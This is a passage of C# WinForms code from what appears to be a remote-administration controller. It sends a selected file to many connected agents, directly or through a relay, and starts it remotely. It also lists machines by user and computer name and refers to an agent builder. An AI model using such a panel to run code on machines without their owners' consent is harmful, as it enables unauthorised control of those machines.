                            if (dlg.IsHandleCreated)
                                dlg.BeginInvoke(updateUi);
                            return;
                        }
                        updateUi();
                    }
                    catch (ObjectDisposedException) { }
                    catch (InvalidOperationException) { }
                };
                y += tableH + 8;

                // ── Action buttons ────────────────────────────────────────────────
                Button btnCancel = new Button
                {
                    Text      = "Cancel",
                    FlatStyle = FlatStyle.Flat,
                    Location  = new Point(W - 214, y),
                    Size      = new Size(88, 34),
                    BackColor = surface,
                    ForeColor = textCol,
                    Font      = new Font("Segoe UI Semibold", 9F, FontStyle.Bold),
                    Cursor    = Cursors.Hand
                };
                btnCancel.FlatAppearance.BorderColor        = border;
                btnCancel.FlatAppearance.MouseOverBackColor = Color.FromArgb(52, 55, 56);
                btnCancel.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 63, 64);
                btnCancel.Click += (s, e) => dlg.Close();

                Button btnSend = new Button
                {
                    Text      = actionLabel,
                    FlatStyle = FlatStyle.Flat,
                    Location  = new Point(W - 118, y),
                    Size      = new Size(100, 34),
                    BackColor = accent,
                    ForeColor = Color.White,
                    Font      = new Font("Segoe UI Semibold", 9F, FontStyle.Bold),
                    Cursor    = Cursors.Hand
                };
                btnSend.FlatAppearance.BorderSize = 0;
                btnSend.FlatAppearance.MouseOverBackColor = accent;
                btnSend.FlatAppearance.MouseDownBackColor = accent;

                // ── Execute click handler ─────────────────────────────────────────
                btnSend.Click += (s, e) =>
                {
                    string fp = tbPath.Text.Trim();
                    if (string.IsNullOrWhiteSpace(fp) || !File.Exists(fp))
                    {
                        MessageBox.Show("Please select a valid file before proceeding.", title,
                            MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }

                    btnSend.Enabled   = false;
                    btnBrowse.Enabled = false;
                    btnCancel.Text    = "Close";

                    // Send to every target on background threads. The command is built per
                    // connection because update handoff tokens are connection-specific.
                    for (int i = 0; i < connCount; i++)
                    {
                        int idx = i;
                        string cid = targetIds[idx];


                        updateRow(idx, "Sending…", muted, 0);

                        string rawCommand;
                        string cmdKey;
                        try
                        {
                            (rawCommand, cmdKey) = buildCommand(fp, cid);
                        }
                        catch (Exception ex)
                        {
                            updateRow(idx, "Error: " + ex.Message, errCol, 0);
                            continue;
                        }
                        byte[] rawBytes = Encoding.UTF8.GetBytes(rawCommand + "\n");

                        Task.Run(async () =>
                        {
                            string resultKey = cid + "|" + cmdKey.ToUpperInvariant();
                            bool isUpdateCommand = string.Equals(cmdKey, "UPDATE:", StringComparison.OrdinalIgnoreCase);
                            Guid pendingId = Guid.Empty;

                            if (IsRelayConnectionId(cid))
                            {
                                try
                                {
                                    RelayCommandResult relayResult = await SendRelayFileCommandAsync(
                                        cid, rawCommand, cmdKey,
                                        (status, percent) => updateRow(idx, status, status.StartsWith("Error", StringComparison.OrdinalIgnoreCase) ? errCol : accent, percent))
                                        .ConfigureAwait(false);
                                    if (relayResult.Accepted)
                                        updateRow(idx, relayResult.Status.Equals("partial", StringComparison.OrdinalIgnoreCase) ? "Partially queued" : "Queued by relay", relayResult.Dropped == 0 ? success : Color.Orange, 100);
                                    else
                                        updateRow(idx, "Rejected: " + relayResult.Detail, errCol, 100);
                                }
                                catch (Exception ex)
                                {
                                    if (isUpdateCommand) RemovePendingUpdateProbeForConnection(cid);
                                    updateRow(idx, "Error: " + ex.Message, errCol, 0);
                                }
                                return;
                            }

                            TcpClient tcpClient = null;
                            lock (connectionStateLock)
                                connectedClients.TryGetValue(cid, out tcpClient);

                            if (tcpClient == null)
                            {
                                updateRow(idx, "Unavailable", errCol, 0);
                                return;
                            }

                            try
                            {
                                NetworkStream ns = tcpClient.GetStream();
                                pendingId = Guid.NewGuid();
                                lock (connectionStateLock)
                                {
                                    pendingCommands[resultKey] = new PendingCommand
                                    {
                                        Id = pendingId,
                                        ConnectionId = cid,
                                        Command = cmdKey.ToUpperInvariant(),
                                        SentAtUtc = DateTime.UtcNow,
                                        PersistResult = true
                                    };
                                    completedCommandResults.Remove(resultKey);
                                }

                                int total = rawBytes.Length;
                                int chunk = Math.Max(4096, total / 20);
                                int sent = 0;
                                while (sent < total)
                                {
                                    int toSend = Math.Min(chunk, total - sent);
                                    ns.Write(rawBytes, sent, toSend);
                                    sent += toSend;
                                    int pct = sent * 100 / total;
                                    updateRow(idx, "Uploading…", accent, Math.Min(pct, 95));
                                }
                                ns.Flush();
                                updateRow(idx, "Awaiting response…", muted, 96);

                                DateTime deadline = DateTime.UtcNow.AddSeconds(30);
                                bool? ackResult = null;
                                while (DateTime.UtcNow < deadline)
                                {
                                    lock (connectionStateLock)
                                    {
                                        if (!pendingCommands.ContainsKey(resultKey))
                                        {
                                            if (completedCommandResults.TryGetValue(resultKey, out bool ack))
                                            {
                                                completedCommandResults.Remove(resultKey);
                                                ackResult = ack;
                                            }
                                            else ackResult = false;
                                            break;
                                        }
                                    }
                                    Thread.Sleep(100);
                                }

                                if (ackResult == null)
                                {
                                    RemovePendingCommandIfCurrent(resultKey, pendingId);
                                    if (isUpdateCommand) RemovePendingUpdateProbeForConnection(cid);
                                    updateRow(idx, "Timed out", errCol, 100);
                                }
                                else if (ackResult == true)
                                    updateRow(idx, "Process started successfully", success, 100);
                                else
                                    updateRow(idx, "Failed – agent returned error", errCol, 100);
                            }
                            catch (Exception ex)
                            {
                                RemovePendingCommandIfCurrent(resultKey, pendingId);
                                if (isUpdateCommand) RemovePendingUpdateProbeForConnection(cid);
                                updateRow(idx, "Error: " + ex.Message, errCol, 0);
                            }
                        });
                    }
                };

                // ── Assemble dialog ───────────────────────────────────────────────
                dlg.Controls.Add(titlePanel);
                dlg.Controls.Add(lblFileHint);
                dlg.Controls.Add(fileRow);
                dlg.Controls.Add(lblConns);
                dlg.Controls.Add(tableOuter);
                dlg.Controls.Add(btnCancel);
                dlg.Controls.Add(btnSend);

                Rectangle ownerClient = RectangleToScreen(ClientRectangle);
                dlg.Location = new Point(
                    ownerClient.Left + Math.Max(0, (ownerClient.Width  - W) / 2),
                    ownerClient.Top  + Math.Max(0, (ownerClient.Height - H) / 2));

                dlg.ShowDialog(this);
            }
        }

        private void RemovePendingUpdateProbeForConnection(string connectionId)
        {
            if (string.IsNullOrWhiteSpace(connectionId))
                return;

            lock (connectionStateLock)
            {
                List<string> removeKeys = pendingUpdateProbes
                    .Where(pair => string.Equals(pair.Value.ConnectionId, connectionId, StringComparison.Ordinal))
                    .Select(pair => pair.Key)
                    .ToList();

                foreach (string key in removeKeys)
                    pendingUpdateProbes.Remove(key);
            }
        }

        // Returns the compact popup label used by the main connection page: UserName@ComputerName.
        private string GetConnectionDisplayName(string connectionId)
        {
            if (gridView == null)
                return connectionId;

            for (int r = 0; r < gridView.DataRowCount; r++)
            {
                string cid = Convert.ToString(gridView.GetRowCellValue(r, "ConnectionId"));
                if (!string.Equals(cid, connectionId, StringComparison.Ordinal))
                    continue;

                string userName = Convert.ToString(gridView.GetRowCellValue(r, "UserName"));
                string computerName = Convert.ToString(gridView.GetRowCellValue(r, "Nickname"));
                if (!string.IsNullOrWhiteSpace(userName) && !string.IsNullOrWhiteSpace(computerName))
                    return userName + "@" + computerName;
                if (!string.IsNullOrWhiteSpace(userName))
                    return userName;
                if (!string.IsNullOrWhiteSpace(computerName))
                    return computerName;
                return connectionId;
            }

            return connectionId;
        }

        private string GetConnectionFingerprint(string connectionId)
        {
            if (gridView == null)
                return string.Empty;

            for (int r = 0; r < gridView.DataRowCount; r++)
            {
                string cid = Convert.ToString(gridView.GetRowCellValue(r, "ConnectionId"));
                if (string.Equals(cid, connectionId, StringComparison.Ordinal))
                    return BlockedConnectionStore.NormalizeFingerprint(Convert.ToString(gridView.GetRowCellValue(r, "Fingerprint")));
            }
            return string.Empty;
        }

        private List<string> GetSelectedConnectionIdsList()
        {
            var ids = new List<string>();
            if (gridView == null) return ids;
            int[] rows = gridView.GetSelectedRows();
            if (rows == null) return ids;
            foreach (int rh in rows)
            {
                if (rh < 0) continue;
                string cid = Convert.ToString(gridView.GetRowCellValue(rh, "ConnectionId"));
                if (!string.IsNullOrWhiteSpace(cid) && !ids.Contains(cid))
                    ids.Add(cid);
            }
            return ids;
        }

        private static System.Drawing.Drawing2D.GraphicsPath CreateRoundedRectanglePath(Rectangle bounds, int radius)
        {
            int diameter = radius * 2;
            System.Drawing.Drawing2D.GraphicsPath path = new System.Drawing.Drawing2D.GraphicsPath();
            path.AddArc(bounds.Left, bounds.Top, diameter, diameter, 180, 90);
            path.AddArc(bounds.Right - diameter, bounds.Top, diameter, diameter, 270, 90);
            path.AddArc(bounds.Right - diameter, bounds.Bottom - diameter, diameter, diameter, 0, 90);
            path.AddArc(bounds.Left, bounds.Bottom - diameter, diameter, diameter, 90, 90);
            path.CloseFigure();
            return path;
        }

        private static void ApplyContextMenuToControlTree(Control root, ContextMenuStrip menu)
        {
            if (root == null || menu == null)
                return;

            root.ContextMenuStrip = menu;
            foreach (Control child in root.Controls)
                ApplyContextMenuToControlTree(child, menu);
        }

        private void connectionsContextMenu_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            contextMenuRowHandle = -1;
            contextMenuFieldName = string.Empty;

            Control source = connectionsContextMenu.SourceControl;
            if (source != null && IsDescendantOf(source, gridControl1))
            {
                Point clientPoint = gridControl1.PointToClient(Control.MousePosition);
                DevExpress.XtraGrid.Views.Grid.ViewInfo.GridHitInfo hitInfo =
                    gridView.CalcHitInfo(clientPoint);

                if (hitInfo.InRow && hitInfo.RowHandle >= 0)
                {
                    contextMenuRowHandle = hitInfo.RowHandle;
                    contextMenuFieldName = hitInfo.Column != null ? hitInfo.Column.FieldName : string.Empty;

                    // Right-click selects the row under the cursor. Preserve an
                    // existing multi-selection when right-clicking inside it.
                    if (!gridView.IsRowSelected(hitInfo.RowHandle))
                    {
                        gridView.ClearSelection();
                        gridView.SelectRow(hitInfo.RowHandle);
                    }
                    gridView.FocusedRowHandle = hitInfo.RowHandle;
                }
            }

            List<string> selectedIds = GetSelectedConnectionIdsList();
            bool hasRelay = selectedIds.Any(IsRelayConnectionId);
            bool transitionPending = selectedIds.Any(id => { lock (connectionStateLock) return pendingRelayTransitions.Contains(id); });
            bool relayConnected = relayGatewayClient != null && relayGatewayClient.IsConnected;
            if (connectionsDirectConnectItem != null) connectionsDirectConnectItem.Enabled = relayConnected && hasRelay && !transitionPending;
            if (connectionsDirectDisconnectItem != null) connectionsDirectDisconnectItem.Enabled = relayConnected && hasRelay && !transitionPending;


            // The visible menu contains only the four requested top-level submenus.
            // The popup performs native measurement, hover rendering and submenu traversal.
            e.Cancel = true;
            connectionsPopupMenu.ShowPopup(Control.MousePosition);

        }

        private static bool IsDescendantOf(Control child, Control ancestor)
        {
            Control current = child;
            while (current != null)
            {
                if (current == ancestor)
                    return true;
                current = current.Parent;
            }

            return false;
        }

        private void accordionControlElement2_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 0;
            accordionControl1.SelectedElement = accordionControlElement2;
        }

        private void accordionControlElement3_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 1;
            accordionControl1.SelectedElement = accordionControlElement3;
        }

        private void accordionControlElement4_Click(object sender, EventArgs e)
        {
            xtraTabPage1.TabControl.SelectedTabPageIndex = 2;
        }

        private void accordionControlElement6_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPage = xtraTabPage5;
            accordionControl1.SelectedElement = accordionControlElement6;
        }

        private void accordionControlElement7_Click(object sender, EventArgs e)
        {
            // Legacy "Convert To (.dll)" page is no longer available.
            // Redirect to the agent builder page.
            xtraTabControl1.SelectedTabPage = xtraTabPage5;
            accordionControl1.SelectedElement = accordionControlElement6;
        }

        private void accordionControlElement13_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPage = xtraTabPage9;
            accordionControl1.SelectedElement = accordionControlElement13;
        }



    }

}

